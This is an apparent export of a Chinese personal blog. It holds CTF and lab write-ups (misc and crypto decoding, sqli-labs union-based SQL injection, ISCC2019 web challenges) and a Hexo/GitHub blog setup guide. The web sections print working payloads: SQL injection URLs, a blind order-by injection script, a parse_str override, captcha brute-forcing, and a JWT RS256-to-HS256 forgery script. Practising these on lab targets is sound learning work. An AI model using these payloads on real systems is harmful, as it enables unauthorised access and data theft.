[{"title":"实验室考核部分writeup","date":"2019-09-28T10:59:17.000Z","path":"2019/09/28/实验室考核部分writeup/","text":"miscmisc-1流量分析题，用wireshark打开，往下面看到 GET /GET.rar 进行追踪流： 打开就能看到flag，稍微整理下就可以了 1flag&#123;badd5c8f4eb677abb458585476b91dd3&#125; misc-2下载文件得到一个未知格式的文件，扔进winhex查看，在最后面看见文件里面包含了一个 01.mp3 和 1569070619.png 文件 文件是的编码是以504B0304，对应的类型应该是zip格式，更改文件的后缀为.zip格式，用360压缩解压（360压缩课直接破解伪加密）得到这两个文件 打开图片文件，发现是一个二维码 微信扫一扫扫一下是一串符号串： 1+++++ ++[-&gt; +++++ ++&lt;]&gt; +.--. +.+++ +++++ .---- ----- .++.. +++.- --... +++++ +.&lt; 扔进百度，可以看到大概是brainfuck加密的结果使用网站https://www.splitbrain.org/services/ook进行解密得到一串数字串 1201902252228 然后有一个mp3音频，应该是音频加密，使用MPS3Stoge进行解密 1Decode.exe -X -P 201902252228 01.mp3 可以得到一个01.mp3.txt文件，打开文件得到一串Unicode编码： 1&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#80;&amp;#114;&amp;#69;&amp;#116;&amp;#84;&amp;#121;&amp;#95;&amp;#49;&amp;#83;&amp;#99;&amp;#67;&amp;#57;&amp;#48;&amp;#49;&amp;#50;&amp;#95;&amp;#103;&amp;#79;&amp;#48;&amp;#100;&amp;#125; Unicode转ascii得到flag 1flag&#123;PrEtTy_1ScC9012_gO0d&#125; misc-3下载得到未知格式的文件，扔进winhex看到都是乱码，没什么用处，然后用notepad++打开，发现是一串字符串，可以看出是当铺密码： 1王人由大工人口中王人大夫人由王中人中工王夫由王口人工由工大由王中人中工王大由工口人中口王由由王中人工大工由由工王人由口夫由由王口王人由工由由大中人口口王口由大工人中工王王由工口王由口王工人口王人由大夫大 经过网站http://www.zjslove.com/3.decode/dangpu/index.html解密得到一串数字 163154302635731623246716034145162324651403206116234541146310711606314115230060154324661406106430631575 观察数字发现所有数字都小于八，猜测是八进制，将八进制转十进制,十进制再转十六进制得到： 1234a = \"63154302635731623246716034145162324651403206116234541146310711606314115230060154324661406106430631575\"b = int(a,8)print(hex(b))//0x666c61677b39353738386539353530343139396133323938666135303036353630623463337d notepad++进行hash-&gt;ascii码得到flag 1flag&#123;95788e95504199a3298fa5006560b4c3&#125; misc-4下载文件打开发现是一串数字 111 1011 00011 1 11 111 1000 001 10 010 1101 1 111 1100 100 00000 11 0 00011 1 111 111 100 0000 11 0001 010 1 0 10000 1100 1001 11 00 大概看一下发现有点像摩斯电码的数字表现形式，将其转换为摩斯电码： 1234567891011a = \"11 1011 00011 1 11 111 1000 001 10 010 1101 1 111 1100 100 00000 11 0 00011 1 111 111 100 0000 11 0001 010 1 0 10000 1100 1001 11 00\"b = \"\"for i in a: if(i==\"1\"): b = b + \"_\" if(i==\"0\"): b = b + \".\" if(i==\" \"): b = b + \" \"print(b)//__ _.__ ...__ _ __ ___ _... .._ _. ._. __._ _ ___ __.. _.. ..... __ . ...__ _ ___ ___ _.. .... __ ..._ ._. _ . _.... __.. _.._ __ .. 再将摩斯电码转换为ascii码 1MY3TMOBUNRQTOZD5ME3TOODHMVRTE6ZXMIYDIMLEGMYTIMRZMVSDEYZQMJRGI 看着这串字符串，肯定不是base64加密，进行base32解密尝试一下： 1f7684la7d&#125;a778gec2&#123;7b041d31429ed2c0bbd 有点像flag，不过是经过了栅栏密码加密的。通过逆向栅栏密码得到flag 1flag&#123;41e07a7e714db677cbd22b8d82039cd4&#125; misc-5把下载的文件放进winhex查看编码 看到既有PNG的开头89504E47又有类似于zip的开头504B1314,将PNG开头删除，并将504B1314修改为504B0304的正确的zip编码开头， 然后将后缀名改为.zip，用360压缩解压文件夹，成功解压文件，得到一张图片和一个txt文档（但是据说原来的zip文档是经过伪加密的，360压缩可以直接绕过伪加密，实际的解法是，在winhex中搜索504B0102然后将后面的09改为00，然后才能解压） 打开txt文档是一串字符串 1IafFRlviO 把图片放进winhex查看，在最后发现一串字符 1VTJGc2RHVmtYMTlnMnFEUnJkdlg1UTFkYTltNlZEUEF4Uys2R0tXcW8wSk92eU4xVjlpWVE3N3JDalAvZS9GZGJmdmlhazY0bWNpeHdpa0ZXcVF0cVE9PQ 将其进行base64进行解密 1U2FsdGVkX19g2qDRrdvX5Q1da9m6VDPAxS+6GKWqo0JOvyN1V9iYQ77rCjP/e/Fdbfviak64mcixwikFWqQtqQ== 再次进行解密,在前面发现 Salted 想到应该是AES加密的方式，将第一次解密得到的字符串和txt中的秘钥进行aes解密得到flag 1flag&#123;7e7dabbbdffbd6a2daa48357aceac4bc&#125; Cryptocrypto-2下载文档解压，得到一个布置格式的附件，用notepad++打开，得到一串字符串和一行字 123..../.../-/.----/.../..-./.----/.-/-.-/.-./.-/./黑板上写着歪歪扭扭的 2 4 1 3 字符串是摩斯电码，在线网站进行解密得到 1HST1SF1AKRAE 再看到2413，尝试每四个字母为一组，2413按原序进行排列得到 1TH1S1SAFAKER 题目提示 1Description: flag:flag&#123;'a~z'+'_'&#125; 把上面的进行改变 1flag&#123;this_is_a_faker&#125; crypto-1解压文件得到一个命名为only_base64的文件夹，打开文件夹又是一个没有格式的文件，notepad++打开，得到以下字符串： 12345v6\"wo5UIP9c4IdCk1o6qZhhB5DKZhVBwBzONl1JRIz:TwB2RyZYBCEVbjBjID17UkUeeDAwPBh1dg86AyAgcSQ4QygYGnAuJQYwzjS0ubQE2hw29FL2qs61ZNOVyFaf6IAjUZ7X8ijuVg:Q1wHADwPAC13PyRlUB90CwUCeHAwGj9hOg0QP34/cjkvY1AOTigOAhktpJryZpVUNpSFi06WlKGkS0Uka6zw1sNCX\"h2urQoyg:SXwmSRMdBz0LJwARAGkObhg6CSo5ZCVcIn0LLnkFfRAiGw9kAzM1GDYthere is the encrypt flag:X1o1VzIPaVgjbmNvCnQAC0ZHY3BbMUkaeylDYWVOCzZDXwJjR3hTFiw3 发现钱三行中间都有冒号，将冒号前后字符串进行base64解密得到一串不知道是什么的东西。。。没出来，后面看出题人的解法，使用python整题直接跑下来的，可以解出得到答案。思路是：前三行冒号前后进行base64解密后进行异或运算，得到的结果和最后一行进行异或运算得到flag 123456789101112131415161718192021//python2import base64x = 'v6\"wo5UIP9c4IdCk1o6qZhhB5DKZhVBwBzONl1JRIz:TwB2RyZYBCEVbjBjID17UkUeeDAwPBh1dg86AyAgcSQ4QygYGnAuJQYw'y = 'zjS0ubQE2hw29FL2qs61ZNOVyFaf6IAjUZ7X8ijuVg:Q1wHADwPAC13PyRlUB90CwUCeHAwGj9hOg0QP34/cjkvY1AOTigOAhkt'z = 'pJryZpVUNpSFi06WlKGkS0Uka6zw1sNCX\"h2urQoyg:SXwmSRMdBz0LJwARAGkObhg6CSo5ZCVcIn0LLnkFfRAiGw9kAzM1GDYt'a, b = x.split(':')c, d = y.split(':')e, f = z.split(':')b = base64.b64decode(b)d = base64.b64decode(d)f = base64.b64decode(f)g = base64.b64decode('X1o1VzIPaVgjbmNvCnQAC0ZHY3BbMUkaeylDYWVOCzZDXwJjR3hTFiw3')flag = ''for i in range(42): t = ord(a[i]) ^ ord(b[i]) flag += chr(ord(g[i]) ^ t)print(flag)//flag&#123;b80f908c-8226-11e9-8b28-88e9fe5197ac&#125; web题有时间再复现吧","tags":[{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"}]},{"title":"sqli-labs writeup","date":"2019-09-16T12:37:11.000Z","path":"2019/09/16/sqli-labs-writeup/","text":"一直想着要刷这边的题目，但是一直没抽出时间来（留下了没技术的泪水）。现在补上。。。本文采用每题有新知识点就写一个知识点 关卡题目下载链接：https://github.com/Audi-1/sqli-labs sqli-labsBasicless1题目链接：http://localhost/sqli-labs-master/Less-1/ 进入页面，看见下面这句话： 1Please input the ID as parameter with numeric value 构造playload：http://localhost/sqli-labs-master/Less-1/?id=1 得到： 12Your Login name:DumbYour Password:Dumb 没有报错出现了一个用户名，在 1 后面添加单引号，即 1&#39; 发现报错： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 在后面添加– +将后面的内容直接注释掉，发现没有报错了，尝试order by查询数据库的列数，构造http://localhost/sqli-labs-master/Less-1/?id=1&#39; order by 1 -- + 当尝试到4时发现开始报错 所以已经爆出列数，接下来就是用union select进行联合查询，爆出数据库、表、列名： 12345http://localhost/sqli-labs-master/Less-1/?id=1' union select 1,2,3 -- +http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_contact(schema_name) from information_schema.schemata-- + //获得数据库名security//这边有一个疑问，%23在url编码中是#，如果直接在url输入#不会被编码，以至于会报错，我还没了解到原因然后我改成了-- + 进行注释后面的内容http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_contact(table_name) from information_schema.tables where table_schema= 'security'-- + //获得列表名 userhttp://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name= 'user'-- + //获得列名 由此我们已经可以获取到用户信息了 1http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,username,password from users where id=3 -- + less2进入界面，获得一句话 1Please input the ID as parameter with numeric value 跟less1是一样的，那就先按照less1的步骤来， 构造playload 123http://localhost/sqli-labs-master/Less-2/?id=1 //没有报错http://localhost/sqli-labs-master/Less-2/?id=1' //报错http://localhost/sqli-labs-master/Less-2/?id=1' order by 1-- + //还是报错 所以跟less1是不同的注入方式，尝试不用单引号闭合，而是使用数字进行查询： 12345678http://localhost/sqli-labs-master/Less-2/?id=1 order by 1-- + //正常http://localhost/sqli-labs-master/Less-2/?id=1 order by 2-- + //正常http://localhost/sqli-labs-master/Less-2/?id=1 order by 3-- + //正常http://localhost/sqli-labs-master/Less-2/?id=1 order by 4-- + //报错http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,2,database() //爆出数据库名'security'http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,2,table_name from information_schema.tables where table_schema='security' //获得表名'emails'http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,2,column_name from information_schema.columns where table_schema='emails' //获得列名'id'http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,username,password from where id=3-- + //获得数据 less3进入界面仍然是那句话 1Please input the ID as parameter with numeric value 按照less1的方法继续注入 123http://localhost/sqli-labs-master/Less-3/?id=1http://localhost/sqli-labs-master/Less-3/?id=1' //报错http://localhost/sqli-labs-master/Less-3/?id=1' order by 1-- + //报错 参考其他的writeup，发现是要进行闭合（），所以进行下面的注入 1234567http://localhost/sqli-labs-master/Less-3/?id=1') order by 1-- + //正常http://localhost/sqli-labs-master/Less-3/?id=1') order by 2-- + //正常http://localhost/sqli-labs-master/Less-3/?id=1') order by 3-- + //正常http://localhost/sqli-labs-master/Less-3/?id=1') order by 4-- + //报错http://localhost/sqli-labs-master/Less-3/?id=-1') union select 1,2,database()-- + //爆出数据库名‘security’http://localhost/sqli-labs-master/Less-3/?id=-1') union select 1,2,table_name from information_schema.tables where table_schema='security'-- + //爆出数据库名‘security’http://localhost/sqli-labs-master/Less-3/?id=-1') union select 1,2,column_name from information_schema.columns where table_schema='emails'-- +","tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"ISCC2019部分题解","date":"2019-05-16T12:28:29.000Z","path":"2019/05/16/ISCC2019部分题解/","text":"前言全程都在划水，只提供了几道思路，自己解出来的可能就是最简单的那一两道，然后就是靠各位师傅带我起飞，复现几道web和misc，其他二进制真的不会。。然后在这场比赛需要脑洞大开，flag形式也是变化不定，需要自己去猜格式 webweb1题目链接：http://39.100.83.188:8001/ 进入链接直接就有了源码 1234567891011121314151617&lt;?phperror_reporting(0);require 'flag.php';$value = $_GET['value'];$password = $_GET['password'];$username = '';for ($i = 0; $i &lt; count($value); ++$i) &#123; if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value); else $username .= chr($value[$i]); if ($username == 'w3lc0me_To_ISCC2019' &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) &#123; echo 'Hello '.$username.'!', '&lt;br&gt;', PHP_EOL; echo $flag, '&lt;hr&gt;'; &#125;&#125;highlight_file(__FILE__); 源码分析： username=’w3lc0me_To_ISCC2019’是由value的值通过chr()函数拼接起来的，查询chr()函数的特性，chr()返回的是ASCII码，并且我们所输入的ASCII码要小于32或者大于127，否则就会被unset(),直接传入w3lc0me_To_ISCC2019，则对应的ASCII码会被unset，然后查看官方的chr()相关手册，发现chr()对传入的数字会进行 mod 256 运算，取余 在官方手册的上方就可以看到ord()函数，发现ord()函数是chr()函数的反函数，所以考虑用脚本进行恢复 1234567891011121314//以下脚本来自队友s=\"w3lc0me_To_ISCC2019\"values=\"\"s1=\"&amp;value[]=\"for i in s: value = ord(i)+256 values=values + s1 + str(value)print(values)//获得的内容&amp;value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313 解决了这个问题就还剩下后面的intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333)，同样查看intval()函数的特性，当看到这条特性时: 我们知道intval函数处理字符串时，会从头开始检测到除数字外的字母为止，而在代码中intval($password + 1) &gt; 2333,是先将$password + 1后再通过intval进行处理，那么如果我们传入的是十六进制数，例如0x10，那intval(‘0x10’)结果是0，而intval(‘0x10’+1)结果为17 所以我们只要构造以下playload就可以啦： 1http://39.100.83.188:8001/?&amp;value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313&amp;password=0x91d flag{8311873e241ccad54463eaa5d4efc1e9} web2题目链接：http://39.100.83.188:8002/ 进入题目，发现是要爆破密码及绕过图片验证码,然后就在网上找了一个工具：PKAV HTTP Fuzzer 1.5.6，工具挺好使的，就是不分图片验证码会出现差错，但是调试一下就行啦 先用bp抓包，获取报文头,放到工具中 12345678910111213141516POST /login.php HTTP/1.1Host: 39.100.83.188:8002Content-Length: 50Cache-Control: max-age=0Origin: http://39.100.83.188:8002Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Referer: http://39.100.83.188:8002/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=4jc9sbpoccp81v7vnqg51ta124Connection: closeusername=admin&amp;pwd=100&amp;user_code=d2ic&amp;Login=submit 查看源码，获得验证码的获取地址 将地址放入工具中，进行调试： 调试完成后进行密码和验证码标记,推荐一个字典生成工具–木头超级字典集 然后就可以进行发包了： 结束后进行长度排序，就可以看到密码是996 拿到密码，就可以拿到flag啦 flag{996_ICU} web3题目链接：http://39.100.83.188:8065 sql-labs 24关原题，考察二次注入 注入点在login_create.php中的username字段，注册用户名为admin’#之后登录admin’#，username字段就赋值给了session中的username字段 在password_change.php中$username是直接从session中取出的，也就是取出的username为admin’#,拼接到sql语句中： 1UPDATE users SET PASSWORD='123' where username='admin'#' and password='$curr_pass' admin用户的密码就被修改为123 但是在这题中没有设置容器，大家都在使用一个数据库，密码也在不断的被人改动，所以会出现改完密码后无法登陆的情况，并且数据库定期修改所有用户密码，所以稳定登陆的方法是不断的发送修改密码的包，如果admin’#用户被注册，可以增加多个# web4题目链接：http://39.100.83.188:8066/ 进入即可获得源码 123456789101112131415161718192021222324&lt;?php error_reporting(0); include(\"flag.php\"); $hashed_key = 'ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a'; $parsed = parse_url($_SERVER['REQUEST_URI']); if(isset($parsed[\"query\"]))&#123; $query = $parsed[\"query\"]; $parsed_query = parse_str($query); if($parsed_query!=NULL)&#123; $action = $parsed_query['action']; &#125; if($action===\"auth\")&#123; $key = $_GET[\"key\"]; $hashed_input = hash('sha256', $key); if($hashed_input!==$hashed_key)&#123; die(\"&lt;img src='cxk.jpg'&gt;\"); &#125; echo $flag; &#125; &#125;else&#123; show_source(__FILE__); &#125;?&gt; 这题的考察点在parse_str变量覆盖，在解析url之后会覆盖原来的变量所以构造sha256($hash_key=1)=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b 所以构造playload： 1http://39.100.83.188:8066/?action=auth&amp;hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b&amp;key=1 flag{7he_rea1_f1@g_15_4ere} web5题目链接：http://39.100.83.188:8054/ 进去很奇怪的就一句话： 队友脑洞打开吧，或者说是做得题目比较少，没那么快想到，在报文头部user-agent字段添加Union.373，然后回应报文会有请输入用户名，在post用户名username=admin回复报文请输入密码，再添加密码password=123，恢复成员密码就是flag 看出是sql注入题，尝试普遍的注入方式，发现过滤了# （）extractvalue sleep and username password等 使用万能密码1’ or ‘1登录，发现有回显出用户名 union_373_Tom 有回显使用联合注入的方式 1username=union_373_Tom&amp;password=1' union select 1,2,3 or' 但是因为过滤了括号，所以没办法继续子查询，于是参考下面这篇文章 参考文章https://blog.csdn.net/nzjdsds/article/details/81879181 文章中提到可以进行union order by的方法进行盲注，思路简单而言就是通过 union 使查询结果为 union_373_Tom 和我们拼接上的一行查询结果通过 order by 对密码 password 字段进行排序，并根据回显的用户名信息来判断排序的结果，下面的是来自队友的本地测试结果： 并且因为题目password字段需要闭合单引号，所以采用的是order by 3, ‘1，mysql会先根据逗号前面的进行排序，如果数据相等，则使用逗号后的进行排序 最后使用的盲注playload为： 1username=union_373_Tom&amp;password=1' or '1' union select 1,'a', '1' order by 3, '1 根据order by是对字符串一位一位的进行比较，所以思路就是对用户密码字段进行逐位进行排序比较，并且通过测试，是根据ASCII码值的大小，并且大小写字符排序相同，测试的字典为： 1_ZzYyXxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAa9876543210 python脚本： 1234567891011121314151617181920import requests url = \"http://39.100.83.188:8054\" headers = &#123; 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36 Union.373' &#125;password = \"\" s = \"_ZzYyXxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAa9876543210 \" for i in range(1,33): for j in s: p = password + j data = &#123; 'username':'union_373_Tom', 'password':\"1' or '1' union select 1,'hhx','\"+p+\"' from admin order by 3,'1\" &#125; r = requests.post(url,data=data,headers=headers) r.encoding = r.apparent_encoding if 'hhx' in r.text: password = password + j print('password:',password) break 最后密码为1SCC_2OI9 最后提交得到flag：flag{1SCC_2OI9} web6题目链接：http://39.100.83.188:8053/ 注册账户，登录网页端抓包得到回复报文： 但是在回复报文中只有一个token的值有用，将token进行解密 发现是使用jwt生成的token，进入官网https://jwt.io/进行解码，解码之后的格式分为三个部分 Header头部带有加密方式alg：RS256,类型typ：“JWT” Payload中是用户的信息 签名字段使用 RSASHA256 分别对 header、payload、secret 进行加密。且 RSASHA256 为非对称加密需要 公钥与私钥进行解密 查找前端源码，http://39.100.83.188:8053/static/js/common.js 处发现 ajax 请求，验证头部身份认证。验证成功弹出文件路径。猜测需要构造 admin Token 进而得到admin 的 data.links 在源码底部发现公钥公钥获取方式 访问 urlhttp://39.100.83.188:8053/pubkey/7D53337755615CEF7E90384692F85CFB 得到公钥 1&#123;\"pubkey\":\"-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\\nIC+LX+9V/mpyKe9R3wIDAQAB\\n-----END PUBLIC KEY-----\",\"result\":true&#125; 因为私钥无法获取到，所以这时我们就需要将算法修改为HS256,如果将算法从RS256更改为HS256，后端代码会使 用公钥作为秘密密钥，然后使用HS256算法验证签名。生成认证字段的脚本如下： 1234import jwt import base64 public = open('1.txt', 'r').read()print jwt.encode(&#123;\"name\": \"iscc19\",\"priv\": \"admin\"&#125;, key=public,algorithm='HS256') 需要将网页上获得的公钥中 \\n 替换成换行，并且这里 priv 之前是为 other ，需要修改为 admin 身份，用户名 name 猜测为之前认证字段的 iscc19 需要额外在python2环境下安装 jwt 模块： pip install PyJWT运行时候需要对 algorithms.py 中 prepare_key 中非法字符注释，否则程序报错。 运行脚本获得字符串 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiaXNjYzE5IiwicHJpdiI6ImFkbWluIn0.bEza2gXi7_q9qPFTSgbu8wWRpmHqHd1FFa-rJKY_38c 带入即可获取 admin 信息 访问 http://39.100.83.188:8053/text/admin:22f1e0aa7a31422ad63480aa27711277 获得 flag 参考链接：https://www.anquanke.com/post/id/145540 misc（等我考试完就更）","tags":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"windows上使用hexo + github 搭建本地博客","date":"2019-04-20T11:23:21.000Z","path":"2019/04/20/windows上使用hexo-github-搭建本地博客/","text":"前言以前看见同学有github上的博客很牛逼，也很羡慕，想想自己要是能搭多好啊，但是能力有限，现在终于搭建起来了，嘻嘻~虽然中间的过程很烦躁，无数次的推倒重新搭建，差点就崩溃了，中间参考了很多很多的博文，很感谢各位博主！我只能记起部分的博文，将在后面展现！ 前期的准备代理！这东西很重要，我们下载下面的这些东西，需要到外面去下载，所以有它比较方便，另外我们要不断的访问github也是要的，不然慢慢爬吧~ node.js下载： https://nodejs.org/zh-cn/ git下载： https://git-scm.com/download/win node.js安装下载好.msi文件后，一路next就好了（强烈建议不要安装在系统盘） 安装好后，打开cmd命令行，执行下面两个命令： 12node -vnpm -v 如下图即为安装成功： git安装下载好的git，一直next就行 安装之后找个空白的地方右键，出现下面两个选项则说明成功： 注意：一般出于安全考虑，只有在Git Bash Here中才能进行Git的相关操作。如果需要在cmd命令行里调用Git，那么就要配置电脑的环境变量Path，或者在安装的时候选择use Git from the Windows Command Prompt。这个可有可无，影响不大，成功配置的界面如图:使用以下命令： 1git --version github注册及建库注册github账号： 新建一个库： 取库名： 注意了，如果说你在上面这张图里取库名的时候，username不是跟前面的这个名字一样，后面真的很麻烦，亲测！所以为了省事还是一样的吧！我出现过下面这种情况： 后面的解决方法就是按照红圈的里面的这个区更改，可以参考下面博客： https://blog.csdn.net/dajian790626/article/details/78595684 里面很详细。 在建好的项目右侧有个settings按钮，点击它，向下拉到GitHub Pages，你会看到那边有个网址，访问它，你将会惊奇的发现该项目已经被部署到网络上，能够通过外网来访问它。 然后你就会出现上面一行绿的，上面有外网的网址，就是你的博客地址 安装hexo进入你要在本地存放博客的地方，我存放在e盘的github/blog下面，所以进入该目录下： 输入命令： 1npm install hexo -g 开始安装hexo，并出现以下界面即为安装成功： 输入代码检验: 1hexo -v 如图即为成功安装： 初识化该文件夹： 若看见Start blogging with Hexo！就可以啦，接下来就是安装所需要的组件： 1npm install 在本地体验下hexo，输入代码： 12hexo g //生成文件hexo s //开启服务 在浏览器输入localhost：4000就能访问到啦~ 将hexo与github连接起来在你放博客的文件夹内，右键打开Git Bash Here，绑定user.name和user.email，命令： 12git config --global user.name \"计算机账户名\"git config --global user.email \"github注册email\" 输入： 12cd ~/.sshls 查看是否有.ssh的文件夹，若ls后出现该文件下的内容，下图说明存在： 输入： 1ssh-keygen -t rsa -C \"你的email地址\" 并连续三下回车，生成秘钥，最后得到两个文件：id_rsa和id_rsa.pub（默认存储路径是：C:\\Users\\Administrator.ssh）。 输入： 1eval \"$(ssh-agent -s)\" 添加密钥到ssh-agent 再输入： 1ssh-add ~/.ssh/id_rsa 添加生成的SSH key到ssh-agent 登录github，点击头像下的settings， 添加ssh： 新建一个new ssh key，将id_rsa.pub文件里的内容复制上去 输入ssh -T git@github.com，测试添加ssh是否成功。如果看到Hi后面是你的用户名，就说明成功了 问题：假如ssh-key配置失败，那么只要以下步骤就能完全解决 首先，清除所有的key-pair 12ssh-add -Drm -r ~/.ssh 删除你在github中的public-key 重新生成ssh密钥对 1ssh-keygen -t rsa -C \"xxx@xxx.com\" 接下来正常操作 在github上添加公钥public-key: 1、首先在你的终端运行 xclip -sel c ~/.ssh/id_rsa.pub将公钥内容复制到剪切板 2、在github上添加公钥时，直接复制即可 3、保存 测试：在终端 ssh -T git@github.com 文件配置在blog文件夹里面找到_config.yml,配置其末尾的deploy里面的值： 第二项的值就在你github项目里的ssh（右下角）clone一下就好了 上传文件将要上传的文件放入下图路径的文件夹内： 注意：文件格式都要是.md格式的，所以要学一下markdown的语法。 在生成以及部署文章之前，需要安装一个扩展： 1npm install hexo-deployer-git --save 使用编辑器编好文章，那么就可以使用命令：hexo d -g，生成以及部署了 部署成功后访问你的地址：http://用户名.github.io。那么将看到生成的文章 选主题如果不喜欢默认的这个主题可以到这个地方去挑选。选择好自己喜欢的主题之后点击主题名进入发布人的github。我当时选择了好几种主题，最后配置失败，才默默选了参考博客里面的这个主题。 复制主题链接然后回到blog目录下，找到并进入theme文件夹右键选择git bash here 输入git clone +你选择的主题链接 下载所选主题 然后可以将主题文件夹名修改成较为简便好记的名字，这里修改成tomotoes然后在blog目录下的_config.yml配置文件中，也就是刚才说的theme配置修改成所选的主题名 然后在blog目录下打开git输入hexo s，本地预览效果 可见虽然主题更换了，但是一些css和js特效并没有显示出来，可能是这个主题需要特殊的一些配置文件，这时候我们就需要进入设计者的github主页中寻找接下来需要的设置。 修改主题配置我们到设计者的github下，在主题下载链接下面会发现有主题的配置的要求： 打开Useage下面的文档链接，按照方框内的三项去配置即可，这边我就不一一截图了！ 注意：这个配置很重要，不然到时候会有各种错误，我就是因为没有很好的配置各主题导致了各种错误，到最后屈服于这个主题！然后要注意你复制进去的代码是否是中文符号，比如说冒号！ 及冒号后面是否有英文格式的一个空格！ 发布配置完上面的就可以按照正常的发布了，第一次发布的博文会比较慢显示，要等会，后面就快了！ 博文放图片之前我不知道怎么放图片在这上面，请教了别人，然后看了其他的博文hexo中的_config.yml中的post_asset_folder值改为true 然后在在Hexo目录下打开Git Brsh，执行一个下载上传图片插件的命令 1npm install hexo-asset-image --save 继续在Git Brsh下利用 1hexo n \"文件名\" 来生成md的文件，这时就会在同级的目录下生成一个同名的文件夹。 在.md的文件中要插入图片时，先要把所要插入的图片放在生成的同名文件夹下。 2.利用markdown的语法将文件引入文章中。最好用绝对路径（不然容易会出现白屏的现象，不知是没有加载上去，还是不能上传相对路径）： 3.最后再提交一下 结束语这篇博文写了很久，但应该是很实用，自己亲测的方法，还是可以的。也花了我很长的时间搭建博客，好辛苦的。参考博客链接： 搭建： https://foxgrin.github.io/posts/29757/?tdsourcetag=s_pctim_aiomsg找错： https://blog.csdn.net/dajian790626/article/details/78595684放图： https://blog.csdn.net/qq_38148394/article/details/79997971","tags":[{"name":"start","slug":"start","permalink":"http://yoursite.com/tags/start/"}]}]